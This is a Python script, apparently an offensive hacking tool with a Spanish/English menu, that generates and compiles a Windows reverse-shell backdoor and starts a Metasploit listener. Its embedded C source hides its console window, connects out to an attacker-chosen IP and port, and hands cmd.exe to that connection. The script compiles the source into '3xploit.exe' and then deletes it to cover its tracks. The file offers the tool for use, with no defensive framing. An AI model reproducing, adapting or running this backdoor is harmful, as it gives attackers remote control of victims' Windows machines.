#!/usr/bin/python

import sys
import os
import io

#Define Colors
class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

#Clear terminal
clear = lambda : os.system('clear')
clear()

#Define backdoor
def backdoor(host, port):
	with io.FileIO(".reverse01.c", "w") as file:
		file.write('''
#include <winsock2.h>
#include <stdio.h>

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma comment(lib,"ws2_32")

  WSADATA wsaData;
  SOCKET Winsock;
  SOCKET Sock;
  struct sockaddr_in hax;
  char ip_addr[16];
  STARTUPINFO ini_processo;
  PROCESS_INFORMATION processo_info;

//int main(int argc, char *argv[])
int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdParam, int iCmdShow)
{

    FreeConsole();

    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
			    
    struct hostent *host;
    host = gethostbyname("'''+host+'''");
    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi("'''+port+'''"));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);

    memset(&ini_processo,0,sizeof(ini_processo));
    ini_processo.cb=sizeof(ini_processo);
    ini_processo.dwFlags=STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&ini_processo,&processo_info);
}
''')

def listener(host, port):
	print colors.OKGREEN + "[*] Starting listener... this may take a while" + colors.ENDC
	os.system('msfconsole -x "use multi/handler;\set LHOST '+host+';\set LPORT '+port+';\set PAYLOAD windows/shell_reverse_tcp;\exploit"')


#Print banner
print colors.HEADER + """
               
#                                                                           
#    .--,-``-.                                                              
#   /   /     '.                         ,--,                       ___     
#  / ../        ;            ,-.----.  ,--.'|              ,--,   ,--.'|_   
#  \ ``\  .`-    '           \    /  \ |  | :     ,---.  ,--.'|   |  | :,'  
#   \___\/   \   :,--,  ,--, |   :    |:  : '    '   ,'\ |  |,    :  : ' :  
#        \   :   ||'. \/ .`| |   | .\ :|  ' |   /   /   |`--'_  .;__,'  /   
#        /  /   / '  \/  / ; .   : |: |'  | |  .   ; ,. :,' ,'| |  |   |    
#        \  \   \  \  \.' /  |   |  \ :|  | :  '   | |: :'  | | :__,'| :    
#    ___ /   :   |  \  ;  ;  |   : .  |'  : |__'   | .; :|  | :   '  : |__  
#   /   /\   /   : / \  \  \ :     |`-'|  | '.'|   :    |'  : |__ |  | '.'| 
#  / ,,/  ',-    ./__;   ;  \:   : :   ;  :    ;\   \  / |  | '.'|;  :    ; 
#  \ ''\        ;|   :/\  \ ;|   | :   |  ,   /  `----'  ;  :    ;|  ,   /  
#   \   \     .' `---'  `--` `---'.|    ---`-'           |  ,   /  ---`-'   
#    `--`-,,-'                 `---`                      ---`-'            
#                                                                           

Selecciona;

1. ==============crear un backdoor=================
2. ===============genera un listener==================
3. #######Crear un backdor y un listener############### 
"""
select = input(colors.WARNING + "Select > " + colors.ENDC)

if(select == 1):
	host = raw_input(colors.OKBLUE + "[?] ingresa tu  IP (LHOST): " + colors.ENDC)
	port = raw_input(colors.OKBLUE + "[?] ingresa tu port (LPORT): " + colors.ENDC)
	
	print colors.OKGREEN + "[*] Creating raw backdoor" + colors.ENDC
	#generate backdoor	
	backdoor(host, port)

	print colors.OKGREEN + "[*] Compiling raw backdoor to MS Executable format" + colors.ENDC
	#compile raw backdoor to exe
	os.system("/usr/bin/i686-w64-mingw32-gcc .reverse01.c -o /root/3xploit.exe -lws2_32")
	print colors.OKBLUE + "[*] Backdoor generated in /root/3xploit.exe" + colors.ENDC


if(select == 2):
	host = raw_input(colors.OKBLUE + "[?] Enter your IP (LHOST): " + colors.ENDC)
	port = raw_input(colors.OKBLUE + "[?] Enter your port (LPORT): " + colors.ENDC)
	
	# start lisneter
	listener(host, port)

if(select == 3):
	host = raw_input(colors.OKBLUE + "[?] Enter your IP (LHOST): " + colors.ENDC)
	port = raw_input(colors.OKBLUE + "[?] Enter your port (LPORT): " + colors.ENDC)
	
	print colors.OKGREEN + "[*] Creating raw backdoor" + colors.ENDC
	#generate backdoor	
	backdoor(host, port)

	print colors.OKGREEN + "[*] Compiling raw backdoor to MS Executable format" + colors.ENDC
	#compile raw backdoor to exe
	os.system("/usr/bin/i686-w64-mingw32-gcc .reverse01.c -o /root/3xploit.exe -lws2_32")
	print colors.OKBLUE + "[*] Backdoor generado en /root/ directory" + colors.ENDC
	#Remove raw backdoor Keep it clear	
	os.system("rm .reverse01.c")

	# start lisneter
	listener(host, port)



